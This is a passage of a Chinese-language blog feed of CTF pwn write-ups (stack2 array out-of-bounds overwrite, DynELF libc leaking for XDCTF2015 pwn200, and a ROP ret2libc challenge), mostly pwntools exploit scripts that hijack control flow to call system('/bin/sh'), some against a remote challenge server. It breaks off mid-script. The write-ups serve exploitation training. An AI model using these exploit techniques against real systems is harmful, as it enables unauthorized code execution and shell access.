    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec stack2</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/stack2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">    可能要用到canary绕过</span><br><span class="line">    ida分析</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190122193700704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">限制了 输入的数量是99</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190122193737266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里就是bug了    因为我们没有检查v13数组的边界 这里我们可以随意输入  然后劫持程序eip  </span><br><span class="line"></span><br><span class="line">然后观察 哪里有system_addr   就ok了 但是 这里输入的是数字 好像有点麻烦</span><br><span class="line"></span><br><span class="line">因为v13 是char 类型的数组 然后我们试着输入一下</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190123100418248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后去栈会发现,这个操作可以用gdb一步步ni下去</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190123100437224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这里其实应该能够注意得到  栈是小段模式  那么我们输入的时候 可以是 反着来  比如地址是 12345678  先输入78 45 34  12  </span><br><span class="line"></span><br><span class="line">才能返回 正确的地址 然后 我们观察一下 哪里有我们system 的地址    </span><br><span class="line"></span><br><span class="line">然后我们发现 本次（这个是会变化的  注意是我这次 运行的） 我们的返回地址FFCF77AC  而我们输入的地址是   FFCF7728  </span><br><span class="line"></span><br><span class="line">那么偏移就是 0x84  然后之后我们找到 system_addr 就ok了  </span><br><span class="line"></span><br><span class="line">然后就找到了  system_addr</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190123101625553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 但是感觉这里/bin/bash 有点怪怪的啊~~~</span><br><span class="line"></span><br><span class="line">先不管 我们试试</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line">from pwn import*</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">system_addr=0x080485AF</span><br><span class="line">leave_offset=0x84</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def write_addr(addr,va):</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">io.sendline(str(addr))</span><br><span class="line">io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">io.sendline(str(va))</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># write  system_addr</span></span><br><span class="line"> </span><br><span class="line">write_addr(leave_offset,0XAF)</span><br><span class="line">write_addr(leave_offset+1,0X85)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于题目的问题所以需要我们自己写入sh</span><br></pre></td></tr></table></figure><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数组下标超界问题</span><br></pre></td></tr></table></figure><p>###exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">system_addr=0x080485AF</span><br><span class="line">leave_offset=0x84</span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'47978'</span>) </span><br><span class="line"></span><br><span class="line">def write_addr(addr,va):</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">io.sendline(str(addr))</span><br><span class="line">io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">io.sendline(str(va))</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write  system_addr  0x08048450</span></span><br><span class="line"> </span><br><span class="line">write_addr(leave_offset,0X50)</span><br><span class="line">write_addr(leave_offset+1,0X84)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"><span class="comment"># sh_addr  0x08048987</span></span><br><span class="line">leave_offset+=8</span><br><span class="line"><span class="built_in">print</span> leave_offset</span><br><span class="line">write_addr(leave_offset,0x87)</span><br><span class="line">write_addr(leave_offset+1,0X89)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"> </span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>rop2</title>
    <link href="http://yoursite.com/2019/07/28/rop2/"/>
    <id>http://yoursite.com/2019/07/28/rop2/</id>
    <published>2019-07-28T11:46:21.869Z</published>
    <updated>2019-07-28T11:55:45.726Z</updated>
    
    <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.csdn.net/zszcr/article/details/79659071" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79659071</a></p><h3 id="DynELF模块"><a href="#DynELF模块" class="headerlink" title="DynELF模块"></a>DynELF模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwn题的无libc泄露用到的pwntools的DynELF模块</span><br><span class="line"></span><br><span class="line">实现条件是：</span><br><span class="line"></span><br><span class="line">有指向libc空间的 能泄露libc空间信息的函数 （write和puts函数）</span><br><span class="line"></span><br><span class="line">能重复触发漏洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DynELF模块的基本框架：</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./xxx'</span>)</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">'xxx'</span>+address+<span class="string">'xxx'</span>  <span class="comment">#address就是你要泄露的地址 ，payload是你控制程序泄露出address处的信息的攻击代码</span></span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    leaked=p.recv(4)<span class="comment">#接受的字节要看程序是32位还是64位来决定 ，32位接受4个字节的数据 而64位接受8个字节的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[%s] -&gt;[%s]=[%s]"</span> % (hex(address),hex(u32(leaked)),repr(leaked))<span class="comment">#输出泄露的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> leaked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dynelf = DynELF(leak,elf=ELF(<span class="string">'./xxx'</span>)) <span class="comment">#初始化DynELF模块</span></span><br><span class="line"></span><br><span class="line">system = dynelf.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">你可以用DynELF模块搜索到system或者是execv函数在内存中地址 但是不能找到<span class="string">"/bin/sh"</span>字符串</span><br><span class="line"></span><br><span class="line">所以<span class="string">"/bin/sh"</span>要自己写入 bss段 </span><br><span class="line"></span><br><span class="line">因为我只做过write函数泄露的题 ，就先写怎么用write函数来实现 puts函数等以后做到了再补上</span><br><span class="line"></span><br><span class="line">write函数原型是 write(1,address,len) <span class="comment">#1表示标准输出流 ，address是write函数要输出信息的地址 ，而len表示输出长度</span></span><br><span class="line"></span><br><span class="line">所以说我们要构造的payload一般是</span><br><span class="line"></span><br><span class="line">x86</span><br><span class="line"></span><br><span class="line">payload=junk+<span class="string">'fakeebp'</span>+p32(write_plt)+p32(return_function)+p32(1)+p32(address)+p32(4)</span><br><span class="line"></span><br><span class="line">amd64</span><br><span class="line"></span><br><span class="line">payload=junk+<span class="string">"fakerbp"</span>+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(address)+p64(pop_rdx)+p64(8)+p64(write_plt)+p64(return_address)</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XDCTF2015-pwn200</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180322200957722" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">检查了下防护机制 发现开启了堆栈不可执行 所以不可以在栈上插入shellcode</span><br><span class="line"></span><br><span class="line">同时在用ROPgadget搜索了下system函数和<span class="string">"/bin/sh"</span> 发现找不到 </span><br><span class="line"></span><br><span class="line">简单运行下发 它输出了一句话 和让我输入一串字符串</span><br><span class="line"></span><br><span class="line">用ida反汇编</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180322201423470" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以发现write函数在plt和got都存在，同时还有<span class="built_in">read</span>函数</span><br><span class="line"></span><br><span class="line">我们就可以用write函数来泄露libc内存空间 ，借助DynELF模块来得到system函数的地址</span><br><span class="line"></span><br><span class="line">向bss段写入<span class="string">"/bin/sh\x00"</span>字符串 然后调用system函数就行了</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./xdctf15-pwn200&apos;)</span><br><span class="line">elf=ELF(&apos;./xdctf15-pwn200&apos;)</span><br><span class="line"></span><br><span class="line">write_plt=elf.symbols[&apos;write&apos;]</span><br><span class="line">write_got=elf.got[&apos;write&apos;]</span><br><span class="line">read_plt=elf.symbols[&apos;read&apos;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">start=0x080483D0</span><br><span class="line">main=0x080484BE</span><br><span class="line">def leak(address):</span><br><span class="line">        payload=&apos;a&apos;*(0x6c+4)+p32(write_plt)+p32(start)+p32(1)+p32(address)+p32(4)</span><br><span class="line">        p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">leaked=p.recv(4)</span><br><span class="line">print &quot;[%s] -&gt; [%s] = [%s]&quot; % (hex(address),hex(u32(leaked)),repr(leaked))</span><br><span class="line">return leaked</span><br><span class="line">d=DynELF(leak,elf=ELF(&apos;./xdctf15-pwn200&apos;))</span><br><span class="line">system=d.lookup(&apos;system&apos;,&apos;libc&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##use pppret  来保持栈平衡 ：调用子程序时先保存堆栈信息（某些堆栈相关的寄存器），待子程序返回后将堆栈恢复到调用前的状态（堆栈用于保存局部变量、函数参数等重要信息），以保证程序能够继续正确运行</span><br><span class="line"></span><br><span class="line">payload2=&apos;a&apos;*(0x6c+4)+p32(read_plt)+p32(0x080485cd)+p32(0)+p32(bss)+p32(8)</span><br><span class="line"></span><br><span class="line">payload2+=p32(system)+p32(0xdeadbeef)+p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.send(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文链接：&lt;a href=&quot;https://blog.csdn.net/zszcr/article/details/79659071&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/zszcr/article/de
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>rop</title>
    <link href="http://yoursite.com/2019/07/28/rop/"/>
    <id>http://yoursite.com/2019/07/28/rop/</id>
    <published>2019-07-28T11:08:58.155Z</published>
    <updated>2019-07-31T11:23:20.135Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/AQ51SQ11~(Y6ROS$Y3HTUB0.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="built_in">return</span> write(1, <span class="string">"Hello, World\n"</span>, 0xDu);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write函数可以写入system函数</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+10h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">read</span>函数可以溢出</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">首先计算padding</span><br><span class="line"></span><br><span class="line">write函数里面有个buf</span><br><span class="line"></span><br><span class="line">+00000000  r              db 4 dup(?)</span><br><span class="line">+00000004 fd              dd ?</span><br><span class="line">+00000008 buf             dd ?</span><br><span class="line"></span><br><span class="line">占8个字节</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span>函数里面的buf</span><br><span class="line"></span><br><span class="line">-00000088 buf             db ?</span><br><span class="line">-00000087                 db ? ; undefined</span><br><span class="line">-00000086                 db ? ; undefined</span><br><span class="line">-00000085                 db ? ; undefined</span><br><span class="line">-00000084                 db ? ; undefined</span><br><span class="line">........</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line"></span><br><span class="line">所以 padding为0x88+4+8</span><br><span class="line"></span><br><span class="line">write函数地址</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180516232447976" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system地址</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180516231426597" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh地址</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/rop1.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main函数地址</span><br><span class="line">同样方法从ida中获取main函数地址：0x80484c6</span><br><span class="line"></span><br><span class="line">之所以需要main函数地址，是因为getshell的时候需要两次溢出。</span><br><span class="line"></span><br><span class="line">第一次：获取write函数的真实地址，再减去偏移，得到libc地址。</span><br><span class="line"></span><br><span class="line">第二次：计算出真实的system地址和bin_sh地址，进行getshell</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">先泄露write函数真实地址，构造rop链为：</span><br><span class="line"></span><br><span class="line">第一项：padding</span><br><span class="line"></span><br><span class="line">第二项：write函数的plt地址</span><br><span class="line"></span><br><span class="line">第三项(write函数参数1)：数字1，write函数第一个参数</span><br><span class="line"></span><br><span class="line">第四项(write函数参数2 输出的内容)：write函数的got地址</span><br><span class="line"></span><br><span class="line">第五项(write函数参数3 输出的长度)：数字4，表示输出4个字节的地址</span><br><span class="line"></span><br><span class="line">第六项： main函数的地址，为了让write函数输出结束后，再执行一遍main函数，进行第二波溢出。</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">elf=ELF(<span class="string">'/home/xfgg/Downloads/rop'</span>)</span><br><span class="line">plt_write=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=0x80484c6</span><br><span class="line">payload1=<span class="string">'a'</span>*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)+p32(main_addr)</span><br><span class="line">p=process(<span class="string">'/home/xfgg/Downloads/rop'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_real=u32(p.recv())</span><br><span class="line"></span><br><span class="line">得到write函数的真实地址后，开始计算Libc地址和system函数地址：</span><br><span class="line"></span><br><span class="line">libc地址 = write函数真实地址 - write函数的offset</span><br><span class="line"></span><br><span class="line">（write函数的offset用/bin/sh的方法，偏移是:0xd43c0）</span><br><span class="line"></span><br><span class="line">system真实地址 = libc地址 + system函数offset</span><br><span class="line"></span><br><span class="line">bin_sh真实地址  = libc地址 + /bin/sh偏移地址offset</span><br><span class="line"></span><br><span class="line">write_offset = 0xd43c0</span><br><span class="line">libc_addr = write_real - write_offset</span><br><span class="line">system_addr = libc_addr + 0x3a940</span><br><span class="line">binsh_addr = libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">第一项：140长度的padding</span><br><span class="line">第二项：system函数真实地址</span><br><span class="line">第三项：/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*140+p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(<span class="string">'/home/xfgg/Desktop/rop'</span>)</span><br><span class="line">p=process(<span class="string">'/home/xfgg/Desktop/rop'</span>)</span><br><span class="line">plt_write=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=0x80484c6</span><br><span class="line">payload1=<span class="string">'a'</span>*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)+p32(main_addr)</span><br><span 